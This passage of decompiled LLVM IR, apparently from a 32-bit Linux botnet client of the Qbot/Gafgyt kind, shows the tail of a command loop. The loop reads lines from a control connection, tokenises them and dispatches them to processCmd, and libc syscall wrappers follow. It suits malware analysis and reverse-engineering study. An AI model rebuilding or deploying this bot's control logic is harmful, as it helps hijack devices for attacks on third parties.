  %v4_804da0b = ptrtoint i8* %v3_804da1c to i32
  store i32 %stack_var_-40.142, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804da0b, i32* @edi, align 4
  %v3_804da33 = call i32 @_strlen(i8* %v3_804da1c)
  %v1_804da37 = add i32 %v3_804da33, 1
  store i32 %v1_804da37, i32* %stack_var_-5888, align 4
  %v1_804da3e = call i32 @malloc(i32 %v1_804da37)
  %v1_804da43 = load i32, i32* @ebp, align 4
  %v2_804da43 = load i32, i32* @ebx, align 4
  %v3_804da43 = mul i32 %v2_804da43, 4
  %v4_804da43 = add i32 %v1_804da43, -616
  %v5_804da43 = add i32 %v4_804da43, %v3_804da43
  %v6_804da43 = inttoptr i32 %v5_804da43 to i32*
  store i32 %v1_804da3e, i32* %v6_804da43, align 4
  %v3_804da4a = load i8*, i8** %stack_var_-36, align 4
  %v4_804da4a = ptrtoint i8* %v3_804da4a to i32
  %v3_804da61 = call i32 @_strlen(i8* %v3_804da4a)
  %v1_804da65 = add i32 %v3_804da61, 1
  %v0_804da6e = load i32, i32* @ebp, align 4
  %v2_804da6e = mul i32 %stack_var_-40.142, 4
  %v3_804da6e = add i32 %v2_804da6e, -616
  %v4_804da6e = add i32 %v0_804da6e, %v3_804da6e
  %v5_804da6e = inttoptr i32 %v4_804da6e to i32*
  %v6_804da6e = load i32, i32* %v5_804da6e, align 4
  %v1_804da75 = inttoptr i32 %v6_804da6e to i8*
  store i32 %v6_804da6e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804da7a = and i32 %v6_804da6e, -256
  %v5_804da7c = call i8* @_memset(i8* %v1_804da75, i32 %v1_804da7a, i32 %v1_804da65)
  %v6_804da7c = ptrtoint i8* %v5_804da7c to i32
  store i32 %v6_804da7c, i32* @ecx, align 4
  %v0_804da84 = load i32, i32* @ebp, align 4
  %v4_804da84 = add i32 %v0_804da84, %v3_804da6e
  %v5_804da84 = inttoptr i32 %v4_804da84 to i32*
  %v6_804da84 = load i32, i32* %v5_804da84, align 4
  store i32 %v6_804da84, i32* @eax, align 4
  store i32 %v6_804da84, i32* %stack_var_-5888, align 4
  %v3_804da92 = inttoptr i32 %v6_804da84 to i8*
  %v4_804da92 = call i32 @strcpy(i8* %v3_804da92, i32 %v4_804da4a)
  store i32 %v4_804da92, i32* @eax, align 4
  %v4_804da97 = add i32 %stack_var_-40.142, 1
  br label %dec_label_pc_804da9a

dec_label_pc_804da9a:                             ; preds = %dec_label_pc_804da0b, %dec_label_pc_804da19
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.142, %dec_label_pc_804da0b ], [ %v4_804da97, %dec_label_pc_804da19 ]
  store i32 0, i32* %stack_var_-5888, align 4
  %v3_804daa9 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056d07.150 to i32))
  store i32 %v3_804daa9, i32* %tmp122, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804dab1 = icmp eq i32 %v3_804daa9, 0
  %v1_804dab5 = icmp eq i1 %v5_804dab1, false
  %tmp124 = inttoptr i32 %v3_804daa9 to i8*
  br i1 %v1_804dab5, label %dec_label_pc_804da0b, label %dec_label_pc_804dabb

dec_label_pc_804dabb:                             ; preds = %dec_label_pc_804da9a, %dec_label_pc_804d9e0
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804d9e0 ], [ %stack_var_-40.0, %dec_label_pc_804da9a ]
  store i32 %stack_var_-40.1.lcssa, i32* %stack_var_-5888, align 4
  %v4_804dacb = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v9_804dad0 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804dad0, i1* %cf.global-to-local, align 1
  %v7_804dad4 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804dad4, label %dec_label_pc_804dae6.lr.ph, label %dec_label_pc_804db03.outer

dec_label_pc_804dae6.lr.ph:                       ; preds = %dec_label_pc_804dabb
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804dae6

dec_label_pc_804dae6:                             ; preds = %dec_label_pc_804dae6.lr.ph, %dec_label_pc_804dae6
  %storemerge179 = phi i32 [ 1, %dec_label_pc_804dae6.lr.ph ], [ %v4_804daf8, %dec_label_pc_804dae6 ]
  %v0_804dae9 = load i32, i32* @ebp, align 4
  %v2_804dae9 = mul i32 %storemerge179, 4
  %v3_804dae9 = add i32 %v2_804dae9, -616
  %v4_804dae9 = add i32 %v3_804dae9, %v0_804dae9
  %v5_804dae9 = inttoptr i32 %v4_804dae9 to i32*
  %v6_804dae9 = load i32, i32* %v5_804dae9, align 4
  store i32 %v6_804dae9, i32* %stack_var_-5888, align 4
  %v1_804daf3 = call i32 @free(i32 %v6_804dae9)
  %v4_804daf8 = add nuw i32 %storemerge179, 1
  %v10_804dafe = icmp ult i32 %v4_804daf8, %stack_var_-40.1.lcssa
  store i1 %v10_804dafe, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804daf8, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_804db03.outer, label %dec_label_pc_804dae6

dec_label_pc_804db03.outer:                       ; preds = %dec_label_pc_804dae6, %dec_label_pc_804d8e5, %dec_label_pc_804dabb, %dec_label_pc_804d78c, %dec_label_pc_804d755, %dec_label_pc_804d464
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_804d464 ], [ %stack_var_-96.1, %dec_label_pc_804d755 ], [ %stack_var_-96.1, %dec_label_pc_804d78c ], [ %stack_var_-96.1, %dec_label_pc_804dabb ], [ %stack_var_-96.1, %dec_label_pc_804d8e5 ], [ %stack_var_-96.1, %dec_label_pc_804dae6 ]
  br label %dec_label_pc_804db03

dec_label_pc_804db03:                             ; preds = %dec_label_pc_804db03.outer, %dec_label_pc_804d6f3
  %v0_804db09 = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804db09, i32* %stack_var_-5888, align 4
  %v5_804db1e = call i32 @recvLine(i32 %v0_804db09, i8* %tmp121, i32 4096)
  %v8_804db26 = icmp ne i32 %v5_804db1e, -1
  store i1 %v8_804db26, i1* %cf.global-to-local, align 1
  %v13_804db26 = icmp eq i32 %v5_804db1e, -1
  %v1_804db2a = icmp eq i1 %v13_804db26, false
  br i1 %v1_804db2a, label %dec_label_pc_804d65e, label %dec_label_pc_804d44d.outer

; uselistorder directives
  uselistorder i32 %v5_804db1e, { 0, 2, 1 }
  uselistorder i32 %stack_var_-96.2.ph, { 0, 2, 1 }
  uselistorder i32 %v4_804daf8, { 1, 0, 2 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_804da37, { 1, 0 }
  uselistorder i32 %stack_var_-40.142, { 0, 3, 2, 1 }
  uselistorder i8* %v3_804da1c, { 2, 1, 0 }
  uselistorder i32 %v4_804d943, { 2, 1, 3, 0 }
  uselistorder i1 %v0_804d8ce, { 1, 0 }
  uselistorder i32 %v7_804d8cc, { 1, 0 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_804d88f, { 1, 0 }
  uselistorder i32 %v1_804d883, { 1, 0 }
  uselistorder i8* %storemerge12165, { 1, 0 }
  uselistorder i32 %v6_804d83c, { 1, 0 }
  uselistorder i32 %v6_804d813, { 1, 0 }
  uselistorder i32 %v6_804d7ee, { 1, 0 }
  uselistorder i8* %v5_804d7cb, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d7c8, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_804d7c5, { 1, 0 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v4_804d72f, { 1, 2, 3, 0 }
  uselistorder i32 %storemerge14, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_804d604, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_804d5d1, { 1, 0 }
  uselistorder i32 %v1_804d5bd, { 1, 0 }
  uselistorder i32 %v2_804d5b4, { 1, 0 }
  uselistorder i32 %v0_804d589, { 1, 0 }
  uselistorder i32 %v0_804d52e, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i8* %storemerge13127, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804d8f2, { 5, 4, 2, 3, 0, 1, 7, 6, 9, 8, 10 }
  uselistorder i8* %tmp121, { 2, 0, 1 }
  uselistorder i32 %v2_804db03, { 2, 0, 4, 6, 5, 1, 7, 9, 8, 10, 3 }
  uselistorder i32 %v1_804d3b0, { 1, 0, 2 }
  uselistorder i32 %v3_804d363, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804d308, { 0, 2, 1 }
  uselistorder i32 %v2_804d2e9, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_804d28c, { 1, 0 }
  uselistorder i32 %v2_804d24b, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32* %stack_var_-5888, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 36, 37, 2, 1, 40, 42, 43, 44, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 30, 1, 0, 2, 4, 3, 49, 5, 56, 6, 7, 54, 8, 55, 9, 10, 52, 11, 12, 14, 15, 13, 16, 17, 18, 19, 51, 20, 21, 22, 23, 24, 25, 29, 50, 26, 27, 28, 31, 48, 46, 32, 47, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 53 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 2, 1 }
  uselistorder i8 33, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 16, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8056c4f.139 to i32), { 0, 2, 1 }
  uselistorder [2 x i8]* @global_var_8056c40.137, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_8056c40.137 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 20, 21 }
  uselistorder i32 ptrtoint (i32* @global_var_8056c2c.135 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db03.outer, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804dae6, { 1, 0 }
  uselistorder label %dec_label_pc_804da9a, { 1, 0 }
  uselistorder label %dec_label_pc_804da0b, { 1, 0 }
  uselistorder label %dec_label_pc_804d9e0, { 1, 0 }
  uselistorder label %dec_label_pc_804d94d, { 1, 0 }
  uselistorder label %dec_label_pc_804d877, { 1, 0 }
  uselistorder label %dec_label_pc_804d866, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d85c, { 1, 0 }
  uselistorder label %dec_label_pc_804d7f5, { 1, 0 }
  uselistorder label %dec_label_pc_804d78c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d782, { 1, 0 }
  uselistorder label %dec_label_pc_804d755, { 1, 0 }
  uselistorder label %dec_label_pc_804d65b, { 1, 0 }
  uselistorder label %dec_label_pc_804d5f0, { 1, 0 }
  uselistorder label %dec_label_pc_804d5ce, { 1, 0 }
  uselistorder label %dec_label_pc_804d51a, { 1, 0 }
  uselistorder label %dec_label_pc_804d4f0, { 1, 0 }
  uselistorder label %dec_label_pc_804d456, { 1, 0 }
  uselistorder label %dec_label_pc_804d44d.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d426, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d3ab, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804d2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804d209, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804db3e = call i32 @vfork()
  %v5_804db41 = icmp ult i32 %v0_804db3e, -4095
  %v1_804db46 = icmp eq i1 %v5_804db41, false
  call void @__pseudo_cond_branch(i1 %v1_804db46, i32 134553092)
  ret i32 %v0_804db3e
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804db50 = load i32, i32* @edi, align 4
  %v0_804db51 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804db69 = add i32 %arg2, -12
  %v6_804db6f = icmp ugt i32 %v1_804db69, 2
  br i1 %v6_804db6f, label %dec_label_pc_804db7f, label %dec_label_pc_804db71

dec_label_pc_804db71:                             ; preds = %entry
  %v4_804db75 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804db69)
  br label %dec_label_pc_804dba1

dec_label_pc_804db7f:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804db87 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804db87, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804db87, -4095
  br i1 %tmp, label %dec_label_pc_804db9f, label %dec_label_pc_804db93

dec_label_pc_804db93:                             ; preds = %dec_label_pc_804db7f
  %v1_804db93 = call i32 @__errno_location(i32 %v0_804db51)
  %v0_804db98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804db98 = sub i32 0, %v0_804db98
  %v2_804db9a = inttoptr i32 %v1_804db93 to i32*
  store i32 %v1_804db98, i32* %v2_804db9a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804db9f

dec_label_pc_804db9f:                             ; preds = %dec_label_pc_804db7f, %dec_label_pc_804db93
  %v0_804db9f = phi i32 [ %v2_804db87, %dec_label_pc_804db7f ], [ -1, %dec_label_pc_804db93 ]
  br label %dec_label_pc_804dba1

dec_label_pc_804dba1:                             ; preds = %dec_label_pc_804db71, %dec_label_pc_804db9f
  %v0_804dba6 = phi i32 [ %v4_804db75, %dec_label_pc_804db71 ], [ %v0_804db9f, %dec_label_pc_804db9f ]
  store i32 %v0_804db51, i32* @ebx, align 4
  store i32 %v0_804db50, i32* @edi, align 4
  ret i32 %v0_804dba6

; uselistorder directives
  uselistorder i32 %v2_804db87, { 1, 0, 2 }
  uselistorder i32 %v0_804db51, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dba1, { 1, 0 }
  uselistorder label %dec_label_pc_804db9f, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dba8 = load i32, i32* @edi, align 4
  store i32 %v0_804dba8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804dbc0 = load i32, i32* @ebx, align 4
  %v1_804dbc8 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804dbc8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dbc8, -4095
  br i1 %tmp, label %dec_label_pc_804dbe0, label %dec_label_pc_804dbd4

dec_label_pc_804dbd4:                             ; preds = %entry
  %v1_804dbd4 = call i32 @__errno_location(i32 %v0_804dbc0)
  %v0_804dbd9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dbd9 = sub i32 0, %v0_804dbd9
  %v2_804dbdb = inttoptr i32 %v1_804dbd4 to i32*
  store i32 %v1_804dbd9, i32* %v2_804dbdb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dbe0

dec_label_pc_804dbe0:                             ; preds = %entry, %dec_label_pc_804dbd4
  %v0_804dbe3 = phi i32 [ %v1_804dbc8, %entry ], [ -1, %dec_label_pc_804dbd4 ]
  %v2_804dbe5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dbe5, i32* %edi.global-to-local, align 4
  ret i32 %v0_804dbe3

; uselistorder directives
  uselistorder i32 %v1_804dbc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dbe0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804dbe9 = load i32, i32* @ebx, align 4
  store i32 %v0_804dbe9, i32* %stack_var_-8, align 4
  %v5_804dbea = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_804dbea, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc10 = load i32, i32* @edi, align 4
  store i32 %v0_804dc10, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804dc18 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804dc20 = call i32 @chdir(i32 %v0_804dc18)
  store i32 %v0_804dc18, i32* @ebx, align 4
  store i32 %v1_804dc20, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dc20, -4095
  br i1 %tmp, label %dec_label_pc_804dc38, label %dec_label_pc_804dc2c

dec_label_pc_804dc2c:                             ; preds = %entry
  %v1_804dc2c = call i32 @__errno_location(i32 %v0_804dc18)
  %v0_804dc31 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc31 = sub i32 0, %v0_804dc31
  %v2_804dc33 = inttoptr i32 %v1_804dc2c to i32*
  store i32 %v1_804dc31, i32* %v2_804dc33, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc38

dec_label_pc_804dc38:                             ; preds = %entry, %dec_label_pc_804dc2c
  %v0_804dc39 = phi i32 [ %v1_804dc20, %entry ], [ -1, %dec_label_pc_804dc2c ]
  %v2_804dc38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc38, i32* @edx, align 4
  %v2_804dc3c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc3c, i32* @edi, align 4
  ret i32 %v0_804dc39

; uselistorder directives
  uselistorder i32 %v1_804dc20, { 1, 0, 2 }
  uselistorder i32 %v0_804dc18, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc38, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc40 = load i32, i32* @edi, align 4
  store i32 %v0_804dc40, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dc48 = load i32, i32* @ebx, align 4
  %v1_804dc50 = call i32 @close(i32 %arg1)
  store i32 %v0_804dc48, i32* @ebx, align 4
  store i32 %v1_804dc50, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dc50, -4095
  br i1 %tmp, label %dec_label_pc_804dc68, label %dec_label_pc_804dc5c

dec_label_pc_804dc5c:                             ; preds = %entry
  %v1_804dc5c = call i32 @__errno_location(i32 %v0_804dc48)
  %v0_804dc61 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc61 = sub i32 0, %v0_804dc61
  %v2_804dc63 = inttoptr i32 %v1_804dc5c to i32*
  store i32 %v1_804dc61, i32* %v2_804dc63, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc68

dec_label_pc_804dc68:                             ; preds = %entry, %dec_label_pc_804dc5c
  %v0_804dc69 = phi i32 [ %v1_804dc50, %entry ], [ -1, %dec_label_pc_804dc5c ]
  %v2_804dc68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc68, i32* @edx, align 4
  %v2_804dc6c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc6c, i32* @edi, align 4
  ret i32 %v0_804dc69

; uselistorder directives
  uselistorder i32 %v1_804dc50, { 1, 0, 2 }
  uselistorder i32 %v0_804dc48, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc68, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc70 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc70, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804dc83 = call i32 @dup2(i32 %v0_804dc70, i32 %tmp4)
  store i32 %v2_804dc83, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dc83, -4095
  br i1 %tmp, label %dec_label_pc_804dc9c, label %dec_label_pc_804dc90

dec_label_pc_804dc90:                             ; preds = %entry
  %v0_804dc90 = load i32, i32* %stack_var_-4, align 4
  %v1_804dc90 = call i32 @__errno_location(i32 %v0_804dc90)
  %v0_804dc95 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dc95 = sub i32 0, %v0_804dc95
  %v2_804dc97 = inttoptr i32 %v1_804dc90 to i32*
  store i32 %v1_804dc95, i32* %v2_804dc97, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dc9c

dec_label_pc_804dc9c:                             ; preds = %entry, %dec_label_pc_804dc90
  %v0_804dc9d = phi i32 [ %v2_804dc83, %entry ], [ -1, %dec_label_pc_804dc90 ]
  %v2_804dca0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dca0, i32* @ebx, align 4
  ret i32 %v0_804dc9d

; uselistorder directives
  uselistorder i32 %v2_804dc83, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dc9c, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dca4 = load i32, i32* @ebx, align 4
  store i32 %v0_804dca4, i32* %stack_var_-4, align 4
  %v1_804dcad = call i32 @fork(i32 %v0_804dca4)
  store i32 %v1_804dcad, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dcad, -4095
  br i1 %tmp, label %dec_label_pc_804dcc4, label %dec_label_pc_804dcb8

dec_label_pc_804dcb8:                             ; preds = %entry
  %v0_804dcb8 = load i32, i32* %stack_var_-4, align 4
  %v1_804dcb8 = call i32 @__errno_location(i32 %v0_804dcb8)
  %v0_804dcbd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dcbd = sub i32 0, %v0_804dcbd
  %v2_804dcbf = inttoptr i32 %v1_804dcb8 to i32*
  store i32 %v1_804dcbd, i32* %v2_804dcbf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dcc4

dec_label_pc_804dcc4:                             ; preds = %entry, %dec_label_pc_804dcb8
  %v0_804dcc5 = phi i32 [ %v1_804dcad, %entry ], [ -1, %dec_label_pc_804dcb8 ]
  %v2_804dcc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dcc4, i32* @edx, align 4
  %v2_804dcc8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dcc8, i32* @ebx, align 4
  ret i32 %v0_804dcc5

; uselistorder directives
  uselistorder i32 %v1_804dcad, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dcc4, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_804dccc = load i32, i32* @ebp, align 4
  %v0_804dccd = load i32, i32* @edi, align 4
  %v0_804dcce = load i32, i32* @esi, align 4
  %v0_804dccf = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dcdb = icmp eq i32 %arg2, 0
  %v1_804dcdd = icmp eq i1 %v1_804dcdb, false
  %v1_804dd07 = icmp eq i32 %arg1, 0
  br i1 %v1_804dcdd, label %dec_label_pc_804dd07, label %dec_label_pc_804dcdf

dec_label_pc_804dcdf:                             ; preds = %entry
  br i1 %v1_804dd07, label %dec_label_pc_804dcf3, label %dec_label_pc_804dce3

dec_label_pc_804dce3:                             ; preds = %dec_label_pc_804dcdf
  %v1_804dce3 = call i32 @__errno_location(i32 %v0_804dccf)
  %v1_804dce8 = inttoptr i32 %v1_804dce3 to i32*
  store i32 22, i32* %v1_804dce8, align 4
  br label %dec_label_pc_804dd78

dec_label_pc_804dcf3:                             ; preds = %dec_label_pc_804dcdf
  %v3_804dcf3 = call i32 @__GI_getpagesize(i32 %v0_804dccf, i32 %v0_804dcce, i32 %v0_804dccd)
  %v1_804dcfd = add i32 %v3_804dcf3, -4096
  %v3_804dcfd = sub i32 4095, %v3_804dcf3
  %v4_804dcfd = and i32 %v3_804dcfd, %v3_804dcf3
  %v5_804dcfd = icmp slt i32 %v4_804dcfd, 0
  %v7_804dcfd = icmp slt i32 %v1_804dcfd, 0
  %v2_804dd02 = icmp eq i1 %v7_804dcfd, %v5_804dcfd
  %v5_804dd02 = select i1 %v2_804dd02, i32 %v3_804dcf3, i32 4096
  store i32 %v5_804dd02, i32* @ebx, align 4
  br label %dec_label_pc_804dd0f

dec_label_pc_804dd07:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804dd0d = icmp eq i1 %v1_804dd07, false
  br i1 %v1_804dd0d, label %dec_label_pc_804dd21, label %dec_label_pc_804dd0f

dec_label_pc_804dd0f:                             ; preds = %dec_label_pc_804dd07, %dec_label_pc_804dcf3
  %v0_804dd12 = phi i32 [ %arg2, %dec_label_pc_804dd07 ], [ %v5_804dd02, %dec_label_pc_804dcf3 ]
  store i32 %v0_804dd12, i32* %stack_var_-44, align 4
  %v1_804dd13 = call i32 @malloc(i32 %v0_804dd12)
  %v1_804dd1b = icmp eq i32 %v1_804dd13, 0
  store i32 %v1_804dd13, i32* @esi, align 4
  br i1 %v1_804dd1b, label %dec_label_pc_804dd78, label %dec_label_pc_804dd0f.dec_label_pc_804dd21_crit_edge

dec_label_pc_804dd0f.dec_label_pc_804dd21_crit_edge: ; preds = %dec_label_pc_804dd0f
  %v0_804dd2c.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804dd21

dec_label_pc_804dd21:                             ; preds = %dec_label_pc_804dd0f.dec_label_pc_804dd21_crit_edge, %dec_label_pc_804dd07
  %v0_804dd2c = phi i32 [ %v0_804dd2c.pre, %dec_label_pc_804dd0f.dec_label_pc_804dd21_crit_edge ], [ %tmp12, %dec_label_pc_804dd07 ]
  %v0_804dd21 = phi i32 [ %v1_804dd13, %dec_label_pc_804dd0f.dec_label_pc_804dd21_crit_edge ], [ %arg1, %dec_label_pc_804dd07 ]
  store i32 %v0_804dd21, i32* @ebx, align 4
  %v2_804dd2c = call i32 @getcwd(i32 %v0_804dd2c, i32 %tmp13)
  %v0_804dd2e = load i32, i32* @ebx, align 4
  store i32 %v0_804dd2e, i32* @edx, align 4
  store i32 %v2_804dd2c, i32* @ebx, align 4
